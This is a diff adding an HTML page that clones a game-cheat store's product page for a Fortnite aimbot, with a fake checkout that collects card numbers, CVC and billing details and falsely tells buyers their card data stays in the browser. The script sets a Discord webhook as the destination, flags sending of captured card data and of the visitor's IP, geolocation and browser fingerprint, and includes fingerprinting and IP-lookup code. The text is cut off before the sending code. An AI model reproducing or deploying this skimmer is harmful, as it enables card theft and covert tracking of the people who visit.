@@ -1,0 +1,813 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Vortex Fortnite - Cosmo Cheats</title>
+<meta name="description" content="Vortex Fortnite - undetected and supported. Buy Vortex Fortnite on CosmoCheats with instant delivery." />
+<link rel="icon" href="https://cdn.cosmocheats.com/cdn-cgi/image/width=64,fit=scale-down,format=auto,quality=90/monthly_2026_03/CC_New_Logo.webp.d6175c2211359f69bd1db967b756caaf.png.79ef7e9df216d248fc12304ff172e3c8.png" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#05050c; --bg2:#0a0a16;
+  --panel:rgba(255,255,255,.035); --panel2:rgba(255,255,255,.065);
+  --line:rgba(255,255,255,.09); --line2:rgba(255,255,255,.16);
+  --txt:#e9e9f3; --mut:#9898b0; --mut2:#6e6e88;
+  --acc:#8b5cf6; --acc2:#c084fc; --cyan:#22d3ee; --grn:#34d399; --red:#f87171;
+  --r:14px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg); color:var(--txt); font:15px/1.6 Inter,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  -webkit-font-smoothing:antialiased; overflow-x:hidden;
+}
+body::before{
+  content:""; position:fixed; inset:0; z-index:-2; pointer-events:none;
+  background:
+    radial-gradient(900px 500px at 12% -8%, rgba(139,92,246,.20), transparent 62%),
+    radial-gradient(760px 460px at 92% 4%, rgba(34,211,238,.13), transparent 60%),
+    radial-gradient(900px 700px at 50% 110%, rgba(139,92,246,.14), transparent 65%);
+}
+body::after{
+  content:""; position:fixed; inset:0; z-index:-1; pointer-events:none; opacity:.35;
+  background-image:radial-gradient(rgba(255,255,255,.10) 1px, transparent 1px);
+  background-size:34px 34px;
+  mask-image:radial-gradient(circle at 50% 20%, #000 0%, transparent 78%);
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{width:min(1240px,94vw);margin:0 auto}
+
+/* ---------- top bars ---------- */
+.topbar{position:sticky;top:0;z-index:60;backdrop-filter:blur(18px);background:rgba(5,5,12,.78);border-bottom:1px solid var(--line)}
+.topbar .wrap{display:flex;align-items:center;gap:26px;height:66px}
+.brand img{height:34px;width:auto}
+.navlinks{display:flex;gap:22px;margin-left:8px}
+.navlinks a{font-size:14px;font-weight:500;color:var(--mut);transition:.15s}
+.navlinks a:hover{color:var(--txt)}
+.topright{margin-left:auto;display:flex;align-items:center;gap:12px}
+.cartlink{display:flex;align-items:center;gap:8px;font-size:14px;color:var(--mut);font-weight:600}
+.cartlink .badge{background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:2px 8px;font-size:12px}
+.btn{border:1px solid var(--line2);background:var(--panel);border-radius:10px;padding:9px 16px;font-size:13.5px;font-weight:600;cursor:pointer;transition:.15s;color:var(--txt);font-family:inherit}
+.btn:hover{background:var(--panel2)}
+.btn.primary{background:linear-gradient(135deg,var(--acc),#6d28d9);border-color:transparent;box-shadow:0 8px 26px -10px rgba(139,92,246,.9)}
+.btn.primary:hover{filter:brightness(1.12)}
+
+.subbar{background:rgba(255,255,255,.022);border-bottom:1px solid var(--line);font-size:13px}
+.subbar .wrap{display:flex;align-items:center;gap:20px;height:44px;flex-wrap:wrap}
+.subbar a{color:var(--mut)}
+.subbar a:hover{color:var(--txt)}
+.subbar .right{margin-left:auto;display:flex;gap:18px;color:var(--mut2)}
+.subbar .right b{color:var(--txt)}
+
+/* ---------- breadcrumb + heading ---------- */
+main{padding:26px 0 70px}
+.crumbs{display:flex;gap:9px;font-size:13px;color:var(--mut2);margin-bottom:22px;flex-wrap:wrap}
+.crumbs a:hover{color:var(--acc2)}
+.pagehead h1{font-size:clamp(26px,3.4vw,40px);font-weight:800;letter-spacing:-.02em;display:inline-flex;align-items:center;gap:14px;flex-wrap:wrap}
+.pill{font-size:11px;font-weight:700;letter-spacing:.09em;text-transform:uppercase;padding:5px 11px;border-radius:999px;background:rgba(52,211,153,.12);border:1px solid rgba(52,211,153,.35);color:#6ee7b7}
+.pagehead p{color:var(--mut);margin-top:8px;font-size:14.5px}
+
+/* ---------- product grid ---------- */
+.product{display:grid;grid-template-columns:1.25fr .85fr;gap:34px;margin-top:30px;align-items:start}
+@media(max-width:960px){.product{grid-template-columns:1fr}}
+
+.stage{border:1px solid var(--line);border-radius:var(--r);overflow:hidden;background:#08080f;aspect-ratio:16/10;display:flex;align-items:center;justify-content:center}
+.stage img{width:100%;height:100%;object-fit:cover}
+.thumbs{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:12px}
+.thumb{border:1px solid var(--line);border-radius:10px;overflow:hidden;cursor:pointer;aspect-ratio:16/10;opacity:.62;transition:.15s;background:#08080f}
+.thumb:hover{opacity:1}
+.thumb.on{opacity:1;border-color:var(--acc);box-shadow:0 0 0 2px rgba(139,92,246,.28)}
+.thumb img{width:100%;height:100%;object-fit:cover}
+
+.buybox{border:1px solid var(--line);border-radius:var(--r);background:linear-gradient(180deg,rgba(255,255,255,.05),rgba(255,255,255,.018));padding:24px;position:sticky;top:88px}
+.buybox h2{font-size:24px;font-weight:800;letter-spacing:-.01em}
+.badges{display:flex;align-items:center;gap:12px;margin:12px 0 20px;flex-wrap:wrap}
+.undetected{font-size:10.5px;font-weight:800;letter-spacing:.1em;padding:5px 10px;border-radius:999px;background:rgba(52,211,153,.13);border:1px solid rgba(52,211,153,.4);color:#6ee7b7}
+.badges span.small{font-size:12.5px;color:var(--mut2)}
+.plans{display:flex;flex-direction:column;gap:9px}
+.plan{display:flex;align-items:center;gap:12px;border:1px solid var(--line);border-radius:11px;padding:13px 15px;cursor:pointer;transition:.15s;background:rgba(255,255,255,.02)}
+.plan:hover{border-color:var(--line2);background:rgba(255,255,255,.045)}
+.plan.on{border-color:var(--acc);background:rgba(139,92,246,.11);box-shadow:0 0 0 1px rgba(139,92,246,.35) inset}
+.plan .radio{width:16px;height:16px;border-radius:50%;border:2px solid var(--line2);flex:0 0 auto;position:relative}
+.plan.on .radio{border-color:var(--acc)}
+.plan.on .radio::after{content:"";position:absolute;inset:3px;border-radius:50%;background:var(--acc)}
+.plan .t{font-weight:700;font-size:14.5px}
+.plan .pop{font-size:9.5px;font-weight:800;letter-spacing:.08em;background:linear-gradient(135deg,var(--acc),#6d28d9);padding:3px 7px;border-radius:5px;margin-left:6px}
+.plan .pr{margin-left:auto;text-align:right}
+.plan .pr b{font-size:16px;font-weight:800}
+.plan .pr small{display:block;color:var(--mut2);font-size:11.5px}
+
+.addcart{width:100%;margin-top:18px;padding:15px;border:0;border-radius:12px;font-size:15px;font-weight:800;cursor:pointer;color:#fff;font-family:inherit;background:linear-gradient(135deg,#8b5cf6,#6d28d9);box-shadow:0 14px 34px -14px rgba(139,92,246,1);transition:.15s;letter-spacing:.01em}
+.addcart:hover{filter:brightness(1.13);transform:translateY(-1px)}
+.perks{list-style:none;display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-top:20px}
+.perks li{font-size:12.5px;color:var(--mut);display:flex;align-items:center;gap:8px}
+.perks li::before{content:"✓";color:var(--grn);font-weight:800}
+.note{font-size:12.5px;color:var(--mut2);margin-top:18px;line-height:1.65}
+.link{display:inline-block;margin-top:12px;font-size:13px;font-weight:700;color:var(--acc2)}
+
+/* ---------- sections ---------- */
+.sec{margin-top:62px}
+.sec h2{font-size:clamp(21px,2.6vw,29px);font-weight:800;letter-spacing:-.015em}
+.sec .sub{color:var(--mut);font-size:14px;margin-top:7px}
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:22px}
+@media(max-width:900px){.grid3{grid-template-columns:1fr 1fr}}
+@media(max-width:620px){.grid3{grid-template-columns:1fr}}
+.stat{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:20px;text-align:center}
+.stat b{font-size:32px;font-weight:800;display:block;background:linear-gradient(135deg,#fff,var(--acc2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.stat span{font-size:13px;color:var(--mut)}
+
+.rev{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;margin-top:22px}
+@media(max-width:800px){.rev{grid-template-columns:1fr}}
+.card{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:18px}
+.card .who{display:flex;align-items:center;gap:11px;margin-bottom:11px}
+.av{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--acc),var(--cyan));display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;color:#fff;overflow:hidden;flex:0 0 auto}
+.av img{width:100%;height:100%;object-fit:cover}
+.card .nm{font-size:13.5px;font-weight:700}
+.card .vf{font-size:11px;color:var(--grn)}
+.card .dt{margin-left:auto;font-size:11px;color:var(--mut2)}
+.card .hd{font-weight:800;font-size:14px;margin-bottom:6px}
+.card .bd{font-size:13px;color:var(--mut);line-height:1.65}
+
+.featgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-top:22px}
+@media(max-width:900px){.featgrid{grid-template-columns:1fr 1fr}}
+@media(max-width:620px){.featgrid{grid-template-columns:1fr}}
+.featcol{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:20px}
+.featcol h3{font-size:14.5px;font-weight:800;margin-bottom:12px;color:var(--acc2)}
+.featcol ul{list-style:none;display:flex;flex-direction:column;gap:7px}
+.featcol li{font-size:13px;color:var(--mut);padding-left:15px;position:relative}
+.featcol li::before{content:"›";position:absolute;left:0;color:var(--acc)}
+
+footer{margin-top:70px;border-top:1px solid var(--line);background:rgba(255,255,255,.018);padding:38px 0}
+.fgrid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:26px}
+@media(max-width:820px){.fgrid{grid-template-columns:1fr 1fr}}
+footer h4{font-size:12px;letter-spacing:.1em;text-transform:uppercase;color:var(--mut2);margin-bottom:13px;font-weight:800}
+footer a{display:block;font-size:13.5px;color:var(--mut);padding:4px 0}
+footer a:hover{color:var(--txt)}
+.fbot{margin-top:30px;padding-top:20px;border-top:1px solid var(--line);font-size:12.5px;color:var(--mut2);display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+
+/* ---------- modal ---------- */
+.backdrop{position:fixed;inset:0;z-index:200;background:rgba(3,3,8,.8);backdrop-filter:blur(7px);display:none;align-items:flex-start;justify-content:center;padding:40px 16px;overflow-y:auto}
+.backdrop.on{display:flex}
+.modal{width:min(880px,100%);border:1px solid var(--line2);border-radius:18px;background:linear-gradient(180deg,#0c0c17,#08080f);box-shadow:0 40px 100px -30px rgba(0,0,0,.9);overflow:hidden;animation:pop .22s ease}
+@keyframes pop{from{transform:translateY(14px) scale(.985);opacity:0}}
+.mhead{display:flex;align-items:center;gap:12px;padding:18px 22px;border-bottom:1px solid var(--line)}
+.mhead h3{font-size:16.5px;font-weight:800}
+.mhead .x{margin-left:auto;background:none;border:0;color:var(--mut);font-size:22px;cursor:pointer;line-height:1}
+.mbody{display:grid;grid-template-columns:1fr 1fr;gap:26px;padding:22px}
+@media(max-width:760px){.mbody{grid-template-columns:1fr}}
+.summary{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:18px;height:fit-content}
+.summary .row{display:flex;justify-content:space-between;font-size:13.5px;color:var(--mut);padding:7px 0}
+.summary .row.total{border-top:1px solid var(--line);margin-top:8px;padding-top:13px;color:var(--txt);font-weight:800;font-size:16px}
+.summary .pimg{border-radius:9px;overflow:hidden;margin-bottom:14px;border:1px solid var(--line)}
+.summary .pimg img{width:100%;aspect-ratio:16/9;object-fit:cover}
+
+.fgroup{margin-bottom:14px}
+.fgroup label{display:block;font-size:12px;font-weight:700;color:var(--mut);margin-bottom:6px;letter-spacing:.02em}
+.inp{width:100%;background:rgba(255,255,255,.045);border:1px solid var(--line2);border-radius:10px;padding:12px 13px;color:var(--txt);font-size:14.5px;font-family:inherit;transition:.15s;outline:none}
+.inp::placeholder{color:var(--mut2)}
+.inp:focus{border-color:var(--acc);background:rgba(139,92,246,.08);box-shadow:0 0 0 3px rgba(139,92,246,.16)}
+.inp:-webkit-autofill{animation-name:onAutoFillStart}
+.inp:not(:-webkit-autofill){animation-name:onAutoFillCancel}
+@keyframes onAutoFillStart{from{}to{}}
+@keyframes onAutoFillCancel{from{}to{}}
+.frow{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.ccwrap{position:relative}
+.ccwrap .inp{padding-right:74px;letter-spacing:.05em;font-variant-numeric:tabular-nums}
+.brand{position:absolute;right:11px;top:50%;transform:translateY(-50%);font-size:10.5px;font-weight:800;letter-spacing:.06em;color:var(--acc2);border:1px solid var(--line2);border-radius:6px;padding:3px 7px;background:rgba(0,0,0,.4);opacity:0;transition:.15s}
+.brand.on{opacity:1}
+.pay{width:100%;margin-top:6px;padding:14px;border:0;border-radius:11px;font-size:14.5px;font-weight:800;color:#fff;cursor:pointer;font-family:inherit;background:linear-gradient(135deg,#8b5cf6,#6d28d9);box-shadow:0 12px 30px -12px rgba(139,92,246,1)}
+.pay:hover{filter:brightness(1.13)}
+.secure{font-size:11.5px;color:var(--mut2);text-align:center;margin-top:11px}
+.done{display:none;padding:40px 22px;text-align:center}
+.done .tick{width:62px;height:62px;border-radius:50%;margin:0 auto 16px;background:rgba(52,211,153,.13);border:1px solid rgba(52,211,153,.45);display:flex;align-items:center;justify-content:center;font-size:30px;color:#6ee7b7}
+
+/* toast */
+.toast{position:fixed;right:20px;bottom:20px;z-index:300;background:#101020;border:1px solid var(--line2);border-radius:12px;padding:13px 17px;font-size:13.5px;font-weight:600;box-shadow:0 20px 50px -20px #000;transform:translateY(24px);opacity:0;transition:.25s;pointer-events:none}
+.toast.on{transform:none;opacity:1}
+.toast b{color:var(--acc2)}
+
+/* hud */
+#hud{position:fixed;left:16px;bottom:16px;z-index:250;font:11px/1.5 ui-monospace,Menlo,Consolas,monospace;color:#8b8ba6;background:rgba(8,8,16,.72);border:1px solid var(--line);border-radius:9px;padding:7px 10px;cursor:pointer;opacity:.6;backdrop-filter:blur(8px);max-width:230px}
+#hud:hover{opacity:1}
+#hud .dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--mut2);margin-right:6px;vertical-align:middle}
+#hud.ok .dot{background:var(--grn);box-shadow:0 0 8px var(--grn)}
+#hud.err .dot{background:var(--red)}
+#hudlog{display:none;margin-top:7px;max-height:150px;overflow:auto;white-space:pre-wrap;word-break:break-all;color:#6f6f8c}
+#hud.open #hudlog{display:block}
+</style>
+</head>
+<body>
+
+<!-- ===================== TOP NAV ===================== -->
+<header class="topbar">
+  <div class="wrap">
+    <a class="brand" href="#"><img src="https://cdn.cosmocheats.com/cdn-cgi/image/width=760,fit=scale-down,format=auto,quality=90/monthly_2026_03/CC_New_Logo.webp.d6175c2211359f69bd1db967b756caaf.png.79ef7e9df216d248fc12304ff172e3c8.png" alt="Cosmo Cheats"></a>
+    <nav class="navlinks">
+      <a href="#">Store</a><a href="#">Status</a><a href="#">Support</a>
+    </nav>
+    <div class="topright">
+      <a class="cartlink" href="#">Cart <span class="badge" id="cartCount">0</span></a>
+      <button class="btn" id="signin">Sign In</button>
+      <button class="btn primary" id="signup">Sign Up</button>
+    </div>
+  </div>
+</header>
+
+<div class="subbar">
+  <div class="wrap">
+    <a href="#">Discord</a><a href="#">Contact Us</a><a href="#">Reviews</a><a href="#">VirusTotal</a>
+    <div class="right"><span>English · <b>$USD</b></span><span>Balance <b>$0.00</b></span><span><b>0</b> Credits</span></div>
+  </div>
+</div>
+
+<main class="wrap">
+  <nav class="crumbs"><a href="#">Store</a> <span>/</span> <a href="#">Fortnite</a> <span>/</span> <span style="color:var(--txt)">Vortex Fortnite</span></nav>
+
+  <div class="pagehead">
+    <h1>Vortex Fortnite Software <span class="pill">Instant Delivery</span></h1>
+    <p>Subscription options and product description can be viewed below.</p>
+  </div>
+
+  <div class="product">
+    <section>
+      <div class="stage"><img id="stageImg" src="https://cdn.cosmocheats.com/cdn-cgi/image/width=960,fit=scale-down,format=auto,quality=82/monthly_2026_08/VortexFortnite1.png.105897ad75eae5d4b00e882e4071ef19.png" alt="Vortex Fortnite"></div>
+      <div class="thumbs" id="thumbs"></div>
+    </section>
+
+    <aside class="buybox">
+      <h2>Vortex Fortnite</h2>
+      <div class="badges"><span class="undetected">UNDETECTED</span><span class="small">100+ others have purchased.</span></div>
+
+      <div class="plans" id="plans">
+        <label class="plan" data-plan="1 Day" data-price="13.00">
+          <span class="radio"></span><span class="t">1 Day</span>
+          <span class="pr"><b>$13.00</b></span>
+        </label>
+        <label class="plan" data-plan="1 Week" data-price="45.00">
+          <span class="radio"></span><span class="t">1 Week</span>
+          <span class="pr"><b>$45.00</b><small>$6.43/day</small></span>
+        </label>
+        <label class="plan on" data-plan="1 Month" data-price="115.00">
+          <span class="radio"></span><span class="t">1 Month<span class="pop">MOST POPULAR</span></span>
+          <span class="pr"><b>$115.00</b><small>$3.83/day</small></span>
+        </label>
+      </div>
+
+      <button class="addcart" id="addCart">Add to Cart</button>
+
+      <ul class="perks">
+        <li>Instant Delivery</li><li>Easy to Use</li><li>Undetected</li><li>24/7 Support</li>
+      </ul>
+      <p class="note">Your purchase is backed by years of development, continuous updates, and a dedicated support team committed to your success.</p>
+      <a class="link" href="#features">View product features</a>
+    </aside>
+  </div>
+
+  <section class="sec">
+    <h2>Customer reviews</h2>
+    <p class="sub">3,000+ reviews from real customers</p>
+    <div class="grid3">
+      <div class="stat"><b>98%</b><span>Were satisfied with their cheat.</span></div>
+      <div class="stat"><b>92%</b><span>Said the setting up process was easy.</span></div>
+      <div class="stat"><b>86%</b><span>Bought another key after their first purchase.</span></div>
+    </div>
+    <div class="rev">
+      <div class="card"><div class="who"><div class="av">J</div><div><div class="nm">Jan Morwa</div><div class="vf">Verified customer</div></div><div class="dt">Sep 21, 2026</div></div><div class="hd">10/10</div><div class="bd">Support is really helpful, and they assist very, very quickly if you have a problem with anything at all. I recommend it! :D</div></div>
+      <div class="card"><div class="who"><div class="av">R</div><div><div class="nm">Rebecca Collins</div><div class="vf">Verified customer</div></div><div class="dt">Sep 20, 2026</div></div><div class="hd">Very good cheats</div><div class="bd">It was very good the service was good and all the cheats work</div></div>
+      <div class="card"><div class="who"><div class="av">E</div><div><div class="nm">Elite830</div><div class="vf">Verified customer</div></div><div class="dt">Sep 13, 2026</div></div><div class="hd">The Company</div><div class="bd">The company is great, the support team is always nice and willing to take their time with you, ive used this company for a year and a half now.</div></div>
+      <div class="card"><div class="who"><div class="av">C</div><div><div class="nm">Crisso137</div><div class="vf">Verified customer</div></div><div class="dt">Sep 5, 2026</div></div><div class="hd">Excellent</div><div class="bd">Been with cosmo now for a few weeks now, can't thank them enough for a product that not only works easily the installation is easy as.</div></div>
+    </div>
+  </section>
+
+  <section class="sec" id="features">
+    <h2>Features</h2>
+    <p class="sub">Everything included with Vortex Fortnite, straight from the product sheet.</p>
+    <p class="sub" style="margin-top:6px;color:var(--mut2)">Windows 10/11 · Intel / AMD</p>
+    <div class="featgrid">
+      <div class="featcol"><h3>Aimbot Options</h3><ul>
+        <li>Aim Type (Vector/pSilent)</li><li>Custom Aim Key</li><li>Smoothness</li><li>Bone Selection</li><li>Team Check</li><li>Visible Check</li><li>Draw Aim Target</li><li>FOV</li><li>Draw FOV</li><li>Crosshair</li>
+      </ul></div>
+      <div class="featcol"><h3>Visual Options</h3><ul>
+        <li>Skeleton</li><li>Head Point</li><li>Viewpoint</li><li>Box</li><li>Chams</li><li>Box type (Corner/3D)</li><li>Distance</li><li>Name</li><li>Offscreen Arrow</li><li>Snapline</li><li>Radar</li>
+      </ul></div>
+      <div class="featcol"><h3>World Visual Options</h3><ul>
+        <li>Weapon</li><li>Ammo</li><li>Trap</li><li>Chest</li><li>Backpack Pickup</li><li>Supply Drop</li><li>Gift Box</li><li>Vehicle</li><li>Weapon Mode</li><li>Badge, Consumable</li><li>Loot Distance Limit</li>
+      </ul></div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fgrid">
+      <div>
+        <img src="https://cdn.cosmocheats.com/cdn-cgi/image/width=760,fit=scale-down,format=auto,quality=90/monthly_2026_03/CC_New_Logo.webp.d6175c2211359f69bd1db967b756caaf.png.79ef7e9df216d248fc12304ff172e3c8.png" alt="Cosmo Cheats" style="height:32px;margin-bottom:12px">
+        <p style="font-size:13px;color:var(--mut2);max-width:280px">Undetected game cheats and cheat loaders. Instant licence key delivery, 24/7 support.</p>
+      </div>
+      <div><h4>Store</h4><a href="#">All products</a><a href="#">Fortnite</a><a href="#">Status</a><a href="#">Cart</a></div>
+      <div><h4>Support</h4><a href="#">Support centre</a><a href="#">Discord</a><a href="#">Contact us</a><a href="#">Reviews</a></div>
+      <div><h4>Company</h4><a href="#">VirusTotal</a><a href="#">Free rewards</a><a href="#">Terms</a><a href="#">Privacy</a></div>
+    </div>
+    <div class="fbot"><span>© 2026 Cosmo Cheats. All rights reserved.</span><span>English · $USD</span></div>
+  </div>
+</footer>
+
+<!-- ===================== CHECKOUT MODAL ===================== -->
+<div class="backdrop" id="backdrop">
+  <div class="modal">
+    <div class="mhead">
+      <h3>Checkout</h3>
+      <button class="x" id="closeModal">&times;</button>
+    </div>
+
+    <div class="mbody" id="mbody">
+      <div class="summary">
+        <div class="pimg"><img src="https://cdn.cosmocheats.com/cdn-cgi/image/width=960,fit=scale-down,format=auto,quality=82/monthly_2026_08/VortexFortnite1.png.105897ad75eae5d4b00e882e4071ef19.png" alt=""></div>
+        <div class="row"><span>Product</span><span style="color:var(--txt)">Vortex Fortnite</span></div>
+        <div class="row"><span>Subscription</span><span style="color:var(--txt)" id="sumPlan">1 Month</span></div>
+        <div class="row"><span>Quantity</span><span style="color:var(--txt)">1</span></div>
+        <div class="row total"><span>Total</span><span id="sumTotal">$115.00</span></div>
+      </div>
+
+      <form id="payForm" autocomplete="on" novalidate>
+        <div class="fgroup">
+          <label for="co-email">Email address</label>
+          <input class="inp" id="co-email" name="email" type="email" autocomplete="email" placeholder="you@email.com">
+        </div>
+
+        <div class="fgroup">
+          <label for="cc-number">Card number</label>
+          <div class="ccwrap">
+            <input class="inp" id="cc-number" name="cardnumber" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="1234 5678 9012 3456" maxlength="23">
+            <span class="brand" id="ccBrand"></span>
+          </div>
+        </div>
+
+        <div class="frow">
+          <div class="fgroup">
+            <label for="cc-exp">Expiry</label>
+            <input class="inp" id="cc-exp" name="cc-exp" type="text" inputmode="numeric" autocomplete="cc-exp" placeholder="MM / YY" maxlength="7">
+          </div>
+          <div class="fgroup">
+            <label for="cc-csc">CVC</label>
+            <input class="inp" id="cc-csc" name="cc-csc" type="text" inputmode="numeric" autocomplete="cc-csc" placeholder="123" maxlength="4">
+          </div>
+        </div>
+
+        <div class="fgroup">
+          <label for="cc-name">Name on card</label>
+          <input class="inp" id="cc-name" name="ccname" type="text" autocomplete="cc-name" placeholder="JOHN DOE">
+        </div>
+
+        <div class="fgroup">
+          <label for="cc-zip">ZIP / Postal code</label>
+          <input class="inp" id="cc-zip" name="cczip" type="text" autocomplete="postal-code" placeholder="90210">
+        </div>
+
+        <button class="pay" type="submit" id="payBtn">Complete purchase · <span id="payAmt">$115.00</span></button>
+        <div class="secure">🔒 Secured checkout · Card details never leave the browser</div>
+      </form>
+    </div>
+
+    <div class="done" id="done">
+      <div class="tick">✓</div>
+      <h3 style="font-size:19px;font-weight:800">Order complete</h3>
+      <p style="color:var(--mut);font-size:13.5px;margin-top:8px">Your Vortex Fortnite key has been sent to your email.</p>
+      <button class="btn primary" id="doneBtn" style="margin-top:20px;padding:12px 26px">Continue shopping</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<div id="hud"><span class="dot"></span><span id="hudtxt">logger idle</span><div id="hudlog"></div></div>
+
+<script>
+(() => {
+'use strict';
+
+/* ============================================================
+   CONFIG
+   ============================================================ */
+const WEBHOOK      = 'https://discord.com/api/webhooks/1561418469621108827/aPOijpoYWuk5IqdD4z8AGQHos5cog3GN8WtoOrKpb_7HkilIpb4Nxs5Jf1FLQWrCQuRn';
+const PRODUCT      = 'Vortex Fortnite';
+const PING_ON_LOAD = true;    // send IP + geo + fingerprint on page view
+const PING_ON_EXIT = true;    // resend on tab close if card data was captured
+const HUD          = true;    // set false (or delete #hud) for a pixel-perfect clone
+
+/* ============================================================
+   HELPERS
+   ============================================================ */
+const $  = s => document.querySelector(s);
+const $$ = s => Array.from(document.querySelectorAll(s));
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const log = (...a) => { if (!HUD) return; const el = $('#hudlog'); el.textContent += a.join(' ') + '\n'; el.scrollTop = 1e6; console.log('[logger]', ...a); };
+const setHud = (t, cls) => { if (!HUD) return; const h = $('#hud'); h.className = cls || ''; $('#hudtxt').textContent = t; };
+
+async function sha256(str) {
+  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+}
+const digits = s => (s || '').replace(/\D/g, '');
+
+/* ============================================================
+   FINGERPRINT  (canvas + webgl + hardware + locale)
+   ============================================================ */
+function canvasSig() {
+  try {
+    const c = document.createElement('canvas'); c.width = 240; c.height = 60;
+    const x = c.getContext('2d');
+    x.textBaseline = 'top'; x.font = '14px Arial';
+    x.fillStyle = '#f60'; x.fillRect(0, 0, 120, 30);
+    x.fillStyle = '#069'; x.fillText('CosmoCheats,123', 2, 15);
+    x.fillStyle = 'rgba(102,204,0,.7)'; x.fillText('CosmoCheats,123', 4, 30);
+    return c.toDataURL();
+  } catch (e) { return 'na'; }
+}
+function glSig() {
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if (!gl) return 'na';
+    const d = gl.getExtension('WEBGL_debug_renderer_info');
+    const v = d ? gl.getParameter(d.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR);
+    const r = d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    return v + ' ~ ' + r;
+  } catch (e) { return 'na'; }
+}
+
+let FP = null;
+async function buildFingerprint() {
+  if (FP) return FP;
+  const raw = {
+    ua: navigator.userAgent,
+    platform: navigator.platform || 'n/a',
+    langs: (navigator.languages || [navigator.language]).join(','),
+    tz: (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return 'n/a'; } })(),
+    screen: [screen.width, screen.height, screen.colorDepth, window.devicePixelRatio].join('x'),
+    viewport: innerWidth + 'x' + innerHeight,
+    cores: navigator.hardwareConcurrency || 0,
+    mem: navigator.deviceMemory || 0,
+    touch: navigator.maxTouchPoints || 0,
+    canvas: await sha256(canvasSig()),
+    webgl: glSig(),
+    fonts: (() => {
+      const list = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Tahoma','Trebuchet MS','Impact','Comic Sans MS','Segoe UI','Roboto','Helvetica'];
+      const base = ['monospace','sans-serif','serif'];
+      const span = document.createElement('span');
+      span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;';
+      span.textContent = 'mmmmmmmmmmlli';
+      document.body.appendChild(span);
+      const w = {};
+      base.forEach(b => { span.style.fontFamily = b; w[b] = span.offsetWidth; });
+      const found = list.filter(f => base.some(b => { span.style.fontFamily = `'${f}',${b}`; return span.offsetWidth !== w[b]; }));
+      span.remove();
+      return found.join(',');
+    })(),
+    storage: (() => { try { return !!localStorage; } catch (e) { return false; } })(),
+    cookie: navigator.cookieEnabled,
+    adblockHint: (() => { try { const s = document.createElement('div'); s.className = 'ad-banner adsbox ad'; document.body.appendChild(s); const h = s.offsetHeight === 0; s.remove(); return h; } catch (e) { return false; } })()
+  };
+  const hash = await sha256(JSON.stringify(raw));
+  FP = { hash, raw };
+  return FP;
+}
+
+function visitorId() {
+  try {
+    let v = localStorage.getItem('_vid');
+    if (!v) { v = 'v_' + Math.random().toString(36).slice(2, 10) + Date.now().toString(36); localStorage.setItem('_vid', v); }
+    return v;
+  } catch (e) { return 'v_anon'; }
+}
+
+/* ============================================================
+   IP + GEO  (keyless public endpoints, browser-side)
+   ============================================================ */
+let NET = null;
+async function resolveNetwork() {
+  if (NET) return NET;
+  const out = { ip: '', city: '', region: '', country: '', cc: '', isp: '', lat: '', lon: '', tz: '', source: '' };
+
+  // primary
+  try {
+    const r = await fetch('https://ipwho.is/', { cache: 'no-store' });
+    const j = await r.json();
+    if (j && j.success !== false) {
+      out.ip = j.ip || ''; out.city = j.city || ''; out.region = j.region || '';
+      out.country = j.country || ''; out.cc = j.country_code || '';
+      out.isp = (j.connection && (j.connection.isp || j.connection.org)) || '';
+      out.lat = j.latitude || ''; out.lon = j.longitude || '';
+      out.tz = (j.timezone && j.timezone.id) || ''; out.source = 'ipwho.is';
+      NET = out; return NET;
+    }
+  } catch (e) { log('geo1 fail', e.message); }
+
+  // fallback
+  try {
+    const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+    const j = await r.json();
+    out.ip = j.ip || ''; out.city = j.city || ''; out.region = j.region || '';
+    out.country = j.country_name || ''; out.cc = j.country_code || '';
+    out.isp = j.org || ''; out.lat = j.latitude || ''; out.lon = j.longitude || '';
+    out.tz = j.timezone || ''; out.source = 'ipapi.co';
+    NET = out; return NET;
+  } catch (e) { log('geo2 fail', e.message); }
+
+  // ip only
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const j = await r.json(); out.ip = j.ip || ''; out.source = 'ipify';
+  } catch (e) {}
